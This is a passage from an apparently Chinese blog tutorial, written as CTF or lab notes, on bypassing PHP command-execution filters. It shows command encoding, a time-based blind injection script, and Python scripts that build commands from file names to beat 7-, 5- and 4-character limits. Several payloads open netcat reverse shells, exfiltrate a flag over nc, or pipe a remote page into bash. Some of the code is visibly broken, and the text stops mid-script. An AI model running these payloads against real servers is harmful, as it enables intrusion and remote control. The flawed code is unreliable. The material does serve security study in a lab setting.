+<li>base32编码<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">S = <span class="string">b&#x27;cat flag.php&#x27;</span></span><br><span class="line">e64 = base64.b32encode(S)</span><br><span class="line"><span class="built_in">print</span>(e64)  <span class="comment">#cat flag.php -&gt; MNQXIIDGNRQWOLTQNBYA====（编码）</span></span><br></pre></td></tr></table></figure>
+<em>解码和base64步骤相似，但是</em><u><code>base64 -d</code>应该改为<code>base32 -d</code></u></li>
+<li>HEX编码（ASCII码）<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">S = <span class="string">b&quot;tac flag&quot;</span></span><br><span class="line">e64 = binascii.b2a_hex(S)</span><br><span class="line"><span class="built_in">print</span>(h)  <span class="comment">#cat flag.php -&gt; 74616320666c61672e706870（编码）</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;74616320666c61672e706870&quot;</span> | xxd -r -p  <span class="comment">#解码读取命令</span></span><br><span class="line"><span class="comment">#执行命令同base64编码：“| /bin/bash”、“| sh”、反引号等</span></span><br><span class="line"><span class="comment">#xxd：二进制显示和处理文件工具。</span></span><br><span class="line"><span class="comment">#-r -p：将纯十六进制转储的反向输出打印为了ASCII格式</span></span><br></pre></td></tr></table></figure></li>
+<li>shellcode编码（16进制的机器码）<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#tac flag.php -&gt; \x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;</span></span><br><span class="line"><span class="comment">#或</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;</span></span><br><span class="line"><span class="comment">#读取命令，执行同bash64</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="无回显时间盲注"><a href="#无回显时间盲注" class="headerlink" title="无回显时间盲注"></a>无回显时间盲注</h2><p><strong>页面无法shell反弹或者无法回显，或者没有写入权限，可以尝试命令盲注。<br>根据返回的时间来进行判断；读取文件指定行的指定位置的字符</strong><br><em>相关命令</em></p>
+<ol>
+<li><code>sleep</code><blockquote>
+<p>#sleep x  （x秒后返回结果）</p>
+</blockquote>
+</li>
+<li><code>awk NR</code>：逐行获取数据<blockquote>
+<p>#cat flag.* | awk NR&#x3D;&#x3D;x  （读取flag文本中第x行的内容）</p>
+</blockquote>
+</li>
+<li><code>cut -c</code>：逐列获取单个字符<blockquote>
+<p>#cat flag.* | awk NR&#x3D;&#x3D;x | cut -c y  （读取第x行第y个字符）</p>
+</blockquote>
+</li>
+<li>if语句：判断命令是否执行<blockquote>
+<p>#if [ $(cat flag.* | awk NR&#x3D;&#x3D;x | cut -c y) &#x3D;&#x3D; F ];then echo “right”;fi  （if []里的条件为真，则执行<code>echo &quot;right&quot;</code>,否则执行<code>fi</code>结束）</p>
+</blockquote>
+</li>
+</ol>
+<ul>
+<li>python使用方法<br><code>ls /</code>查看根目录来获取flag文件名<br>建立文件pcc.py<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&quot;http://x.x.x.x xxxx/class08/1.php&quot;</span>  <span class="comment">#1.php：可访问文件（漏洞点）</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):  <span class="comment">#行号</span></span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):  <span class="comment">#列数</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):  <span class="comment">#把ascii码转换成字母，HEX编码变成字符</span></span><br><span class="line">      k=<span class="built_in">chr</span>(k)</span><br><span class="line">      time.sleep(<span class="number">0.1</span>)</span><br><span class="line">      payload = <span class="string">&quot;?cmd=&quot;</span> + <span class="string">f&quot;if[`ls | awk NR==<span class="subst">&#123;i&#125;</span> | cut -c <span class="subst">&#123;j&#125;</span>` == <span class="subst">&#123;k&#125;</span>];then sleep 2;fi&quot;</span>  <span class="comment">#比较字符串，正确则延迟2秒显示</span></span><br><span class="line">      <span class="keyword">try</span>:</span><br><span class="line">        requests.get(url=url+payload,timeout=(<span class="number">1.5</span>,<span class="number">1.5</span>))  <span class="comment">#显示时间超过1.5秒则为需要的字符</span></span><br><span class="line">      <span class="keyword">except</span>:</span><br><span class="line">        result = result + k</span><br><span class="line">        <span class="built_in">print</span>(result)  <span class="comment">#把值赋值给result并输出</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">  result +=<span class="string">&quot;&quot;</span>  <span class="comment">#累加形成字符串</span></span><br></pre></td></tr></table></figure>
+读取需要的文本内容则只需要把<code>ls</code>命令换成<code>cat flag文件名.php</code>、改变IP地址或行列数等。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pcc.py  <span class="comment">#执行该文件，读取需要的内容</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="长度过滤绕过"><a href="#长度过滤绕过" class="headerlink" title="长度过滤绕过"></a>长度过滤绕过</h2><p><strong>相关命令</strong></p>
+<ul>
+<li><code>&gt;</code>符号和<code>&gt;&gt;</code>符号<ul>
+<li><code>&gt;</code>：创建文件并写入内容，如果文件存在且里面有其他内容，则会清空再写入</li>
+<li><code>&gt;&gt;</code>：在下一行追加内容（文件存在）<blockquote>
+<p>#&gt; b  （创建文件b，类似<code>touch b</code>）<br>#echo benben &gt; a  （创建文件并把字符串“benben”写到文件a里）</p>
+</blockquote>
+</li>
+</ul>
+</li>
+</ul>
+<p>#echo abb &gt;&gt; a  （在a文件里追加内容abb）</p>
+<ul>
+<li>命令换行<code>\</code>命令连接符<blockquote>
+<p>#cat a  可以等同于</p>
+</blockquote>
+</li>
+</ul>
+<p>#c\<br>a\<br>t \<br>a</p>
+<ul>
+<li><code>ls -t</code>命令：将文件名按照时间顺序排列，越早创建排得越后面，精确度到秒（<code>ls</code>以ASCII码值排列，值越大越后面）<br><strong>组合运用</strong>（命令长度被限制，用短的文件名拼接成可执行命令）<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;ag</span><br><span class="line">&gt;fl\\</span><br><span class="line">&gt;<span class="string">&quot;t \\&quot;</span></span><br><span class="line">&gt;ca\\</span><br><span class="line"><span class="built_in">ls</span> -t &gt; a  <span class="comment">#把创建的所有文件名按创建时间顺序存储到a</span></span><br></pre></td></tr></table></figure>
+<em>a的内容</em>：<img src="/2026/01/19/php%E5%91%BD%E4%BB%A42/1.png" class="" loading='lazy'>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">. a  <span class="comment">#执行a文件（可能报错，但会执行命令）</span></span><br><span class="line"><span class="comment">#或</span></span><br><span class="line">sh a</span><br></pre></td></tr></table></figure>
+<img src="/2026/01/19/php%E5%91%BD%E4%BB%A42/2.png" class="" loading='lazy'></li>
+<li><code>dir</code>及<code> *</code>和<code>rev</code><ul>
+<li><code>dir</code>：和<code>ls</code>功能类似，但开头字母是d，这使它在alphabetical序中靠前</li>
+<li><code> *</code>：相当于<code>$(dir *)</code>，如果第一个文件名是命令就会执行命令，返回执行的结果，之后的文件名作为参数传入</li>
+<li><code>rev</code>：反转文件每一行的内容（行数不变）<table>
+<thead>
+<tr>
+<th align="center"><img src="/2026/01/19/php%E5%91%BD%E4%BB%A42/3.png" class="" loading='lazy'></th>
+<th align="center"><img src="/2026/01/19/php%E5%91%BD%E4%BB%A42/4.png" class="" loading='lazy'></th>
+<th align="center"><img src="/2026/01/19/php%E5%91%BD%E4%BB%A42/5.png" class="" loading='lazy'></th>
+</tr>
+</thead>
+</table>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="监听操作"><a href="#监听操作" class="headerlink" title="监听操作"></a>监听操作</h3><ul>
+<li>kali开启web服务：<code>python -m http.server 80</code><ol>
+<li>在默认页面index.html添加指令<code>nc 192.1.141.1 7777 -e /bin/bash</code><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> index.html  <span class="comment">#创建</span></span><br><span class="line"></span><br><span class="line">vim index.html  <span class="comment">#打开文件并开始写入内容</span></span><br></pre></td></tr></table></figure></li>
+<li>执行指令<code>nc -lvp 7777</code>监听端口</li>
+</ol>
+</li>
+<li>目标靶机执行该期望指令：<ol>
+<li><code>curl 192.1.141.1</code>：访问192.1.141.1并下载默认页面index.html</li>
+<li><code>| bash</code>：把限制的index.html交给bash执行<code>nc 192.1.141.1 7777 -e /bin/bash</code>提交结果给kali</li>
+</ol>
+</li>
+</ul>
+<h3 id="长度限制为7绕过"><a href="#长度限制为7绕过" class="headerlink" title="长度限制为7绕过"></a>长度限制为7绕过</h3><p><strong>准备工作</strong><br>SSH连接Docker方便操作</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//例题</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$argv</span></span>)</span>&#123;</span><br><span class="line">  <span class="variable">$a</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;/\*|\?|/&quot;</span>,<span class="string">&quot;=====&quot;</span>,<span class="variable">$argv</span>);  <span class="comment">//过滤字符*、？，替换成“=====”</span></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &lt;= <span class="number">7</span>)&#123;  <span class="comment">//GET提交cmd，限制长度&lt;= 7</span></span><br><span class="line">  <span class="title function_ invoke__">exec</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]));  <span class="comment">//filter过滤</span></span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;flag in local path flag file&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><em>期望执行的命令</em></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> flag|nc 192.1.141.1 7777</span><br><span class="line"><span class="comment"># 192.1.141.1为（假设）某个kali的IOP地址/监听端口7777</span></span><br><span class="line">nc -lvp 7777</span><br><span class="line"><span class="comment">#cat flag展示内容，通过nc反弹提交到192.1.141.1:7777</span></span><br></pre></td></tr></table></figure>
+<p><em>nc反弹shell交互界面</em></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.1.141.1 7777 -e /bin/bash</span><br></pre></td></tr></table></figure>
+<p><em>远程控制</em><br>shell反弹读取结果需要<a href="#%E7%9B%91%E5%90%AC%E6%93%8D%E4%BD%9C">监听操作</a><br>因为命令长度限制，应该用\把期望执行的命令拆成长度不超过7的字符串 &rArr;<a href="#%E9%95%BF%E5%BA%A6%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87">长度过滤绕过</a><br><strong>python脚本</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">baseurl = <span class="string">&quot;http://192.1.141.1:19080/class09/2/index.php?cmd=&quot;</span></span><br><span class="line">s = requests.session()  <span class="comment">#目标网址</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>=[</span><br><span class="line">  <span class="string">&#x27;&gt;7777&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;&gt;\ \\&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;&gt;1\\&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;&gt;141.\\&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;&gt;1.\\&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;&gt;192.\\&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;&gt;c\%20\\&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;&gt;\|n\\&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;&gt;flag\\&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;&gt;t\ \\&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;&gt;ca\\&#x27;</span>  <span class="comment">#拼接成命令cat flag|nc 192.1.141.1 7777（文件名不能重复）</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">  time.sleep(<span class="number">1</span>)  <span class="comment">#创建文件造成时间差</span></span><br><span class="line">  url = baseurl+<span class="built_in">str</span>(i)</span><br><span class="line">  s.get(url)</span><br><span class="line"></span><br><span class="line">s.get(baseurl+<span class="string">&quot;sh a&quot;</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="长度限制为5绕过"><a href="#长度限制为5绕过" class="headerlink" title="长度限制为5绕过"></a>长度限制为5绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//例题</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$argv</span></span>)</span>&#123;</span><br><span class="line">  <span class="variable">$a</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;/\*|\?|/&quot;</span>,<span class="string">&quot;=====&quot;</span>,<span class="variable">$argv</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &lt;= <span class="number">7</span>)&#123;  <span class="comment">//限制长度&lt;= 5</span></span><br><span class="line">  <span class="title function_ invoke__">exec</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]));</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;flag in local path flag file&quot;</span>;</span><br><span class="line">&#125;  <span class="comment">//和限制为7相似</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>更换期望执行的命令</strong></p>
+<blockquote>
+<p>#curl 192.1.141.1 | bash</p>
+</blockquote>
+<p><em>远程控制</em><br>shell反弹读取结果需要<a href="#%E7%9B%91%E5%90%AC%E6%93%8D%E4%BD%9C">监听操作</a><br><strong>构造<code>ls -t&gt;y</code></strong><br>因为长度限制为5，所以指令<code>ls -t&gt;y</code>受到限制<br><em>解决方法</em></p>
+<ul>
+<li>先创建文件ls\</li>
+<li>再创建文件_，把“ls\”写入文件_</li>
+<li>再创建其他部分</li>
+<li>用<code>&gt;&gt;</code>把所有文件名追加到_<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="built_in">ls</span>\\  <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">ls</span>&gt;_  <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;-t\\</span><br><span class="line">&gt;\&gt;y  <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">ls</span>&gt;&gt;_  <span class="comment">#4</span></span><br></pre></td></tr></table></figure>
+
+<strong>分解命令，创造文件</strong><br>拆开指令<code>curl 192.1.141.1|bash</code>，长度不超过5（<a href="#%E9%95%BF%E5%BA%A6%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87">长度过滤绕过</a>）<br>需要用<code>sh _</code>代替<code>ls -t&gt;y</code><br><strong>执行命令</strong><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sh y</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> flag  <span class="comment">#获取flag</span></span><br></pre></td></tr></table></figure>
+<strong>python脚本</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> ...</span><br><span class="line">baseurl = <span class="string">&quot;http://192.1.141.1:18080/class09/3/index.php?cmd=&quot;</span></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="comment">#将ls -t&gt;y写入文件</span></span><br><span class="line"><span class="built_in">list</span>=[</span><br><span class="line">  <span class="string">&quot;&gt;ls\\&quot;</span>,</span><br><span class="line">  <span class="string">&quot;&gt;ls&gt;_&quot;</span>,</span><br><span class="line">  <span class="string">&quot;&gt;\ \\&quot;</span>,</span><br><span class="line">  <span class="string">&quot;&gt;-t\\&quot;</span>,</span><br><span class="line">  <span class="string">&quot;&gt;\&gt;y&quot;</span>,</span><br><span class="line">  <span class="string">&quot;ls&gt;&gt;_&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># curl 192.1.141.1|bash</span></span><br><span class="line"><span class="built_in">list</span> <span class="number">2</span>=[</span><br><span class="line">  <span class="string">&quot;&gt;bash&quot;</span>,</span><br><span class="line">  <span class="string">&quot;&gt;\|\\&quot;</span>,</span><br><span class="line">  <span class="string">&quot;&gt;\/\\&quot;</span>,</span><br><span class="line">  <span class="string">&quot;&gt;.1\\&quot;</span>,</span><br><span class="line">  <span class="string">&quot;41&gt;\\&quot;</span>,</span><br><span class="line">  <span class="string">&quot;&gt;1\\&quot;</span>,</span><br><span class="line">  <span class="string">&quot;&gt;1.\\&quot;</span>,</span><br><span class="line">  <span class="string">&quot;&gt;2.\\&quot;</span>,</span><br><span class="line">  <span class="string">&quot;&gt;19\\&quot;</span>,</span><br><span class="line">  <span class="string">&quot;&gt;\ \\&quot;</span>,</span><br><span class="line">  <span class="string">&quot;&gt;rl\\&quot;</span>,</span><br><span class="line">  <span class="string">&quot;&gt;cu\\&quot;</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:  <span class="comment">#循环语句依次提交数组</span></span><br><span class="line">  time.sleep(<span class="number">1</span>)</span><br><span class="line">  url = baseurl+<span class="built_in">str</span>(i)</span><br><span class="line">  s.get(url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">list</span> <span class="number">2</span>:</span><br><span class="line">  time.sleep(<span class="number">1</span>)</span><br><span class="line">  url = baseurl+<span class="built_in">str</span>(j)</span><br><span class="line">  s.get(url)</span><br><span class="line"></span><br><span class="line">s.get(baseurl+<span class="string">&quot;sh _&quot;</span>)  <span class="comment">#创建y，写入ls -t&gt;y</span></span><br><span class="line">s.get(baseurl+<span class="string">&quot;sh y&quot;</span>)  <span class="comment">#执行期望命令，反弹shell</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="长度限制为4绕过"><a href="#长度限制为4绕过" class="headerlink" title="长度限制为4绕过"></a>长度限制为4绕过</h3><p>（例题可以修改长度限制为5的代码）<br>问题：追加<code>ls&gt;&gt;_</code>指令长度为5超过4<br><em>解决方法</em><br>运用<code>*</code>、<code>dir</code>、<code>rev</code>&rArr;<a href="#%E9%95%BF%E5%BA%A6%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87">长度过滤绕过</a></p>
+<ul>
+<li>构造ls -t&gt;g<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#构造g&gt; ht- sl</span></span><br><span class="line">&gt;g\&gt;</span><br><span class="line">&gt;ht-  <span class="comment">#为了让字符排序正确指令而加个h（不影响命令执行）</span></span><br><span class="line">&gt;sl</span><br><span class="line">&gt;<span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line">*  <span class="comment">#g&gt; ht- sl</span></span><br><span class="line">*&gt;v  <span class="comment">#在文件v写入g&gt; ht- sl</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#构造rev v后直接写入ls -t&gt;g</span></span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;x  <span class="comment">#*v ==&gt; rev v的结果作为参数写入x（既匹配rev，又执行v）</span></span><br><span class="line"><span class="comment">#cat x ==&gt; x:ls -th&gt;g</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#注意</span></span><br><span class="line">&gt;g\;</span><br><span class="line"><span class="comment">#为了防止“g”后面其他文件名造成的影响</span></span><br><span class="line"><span class="comment">#多创建一个文件“g\;”，用“;”阻断后面字符的影响</span></span><br></pre></td></tr></table></figure></li>
+<li>构造一个反弹shell<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#依然要拆开拼接</span></span><br><span class="line">curl 0xC0018D01|bash  </span><br><span class="line"><span class="comment"># 192.1.141.1以十六进制表达（文件名在十进制下难以不重复）</span></span><br></pre></td></tr></table></figure></li>
+<li>用反弹回来的shell查看flag</li>
+<li><em>远程控制</em><br>shell反弹读取结果需要进行<a href="#%E7%9B%91%E5%90%AC%E6%93%8D%E4%BD%9C">监听操作</a><br><strong>python脚本</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> ...</span><br><span class="line">baseurl = <span class="string">&quot;http://192.1.141.1:18080/class09/4/index.php?cmd=&quot;</span>  <span class="comment">#docker的IP和端口</span></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="comment">#将ls -t&gt;y写入文件</span></span><br><span class="line"><span class="built_in">list</span>=[</span><br><span class="line">  <span class="string">&quot;&gt;g\;&quot;</span>,</span><br><span class="line">  <span class="string">&quot;&gt;g\&gt;_&quot;</span>,</span><br><span class="line">  <span class="string">&quot;&gt;ht-&quot;</span>,</span><br><span class="line">  <span class="string">&quot;&gt;sl&quot;</span>,</span><br><span class="line">  <span class="string">&quot;&gt;dir&quot;</span>,</span><br><span class="line">  <span class="string">&quot;*&gt;v&quot;</span>,</span><br><span class="line">  <span class="string">&quot;&gt;rev&quot;</span>,</span><br><span class="line">  <span class="string">&quot;*v&gt;x&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># curl 192.1.141.1|bash</span></span><br><span class="line"><span class="built_in">list</span> <span class="number">2</span>=[</span><br><span class="line">  <span class="string">&quot;&gt;ash&quot;</span>,</span><br><span class="line">  <span class="string">&quot;&gt;b\\&quot;</span>,</span><br><span class="line">  <span class="string">&#x27;&gt;\|\\&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;&gt;01\\&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;&gt;8D\\&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;&gt;01\\&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;&gt;c0\\&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;&gt;0x\\&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;&gt;\ \\&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;&gt;rl\\&#x27;</span>,</span><br><span class="line">  <span class="string">&quot;&gt;cu\\&quot;</span></span><br><span class="line">]</span><br><span class="line"><span 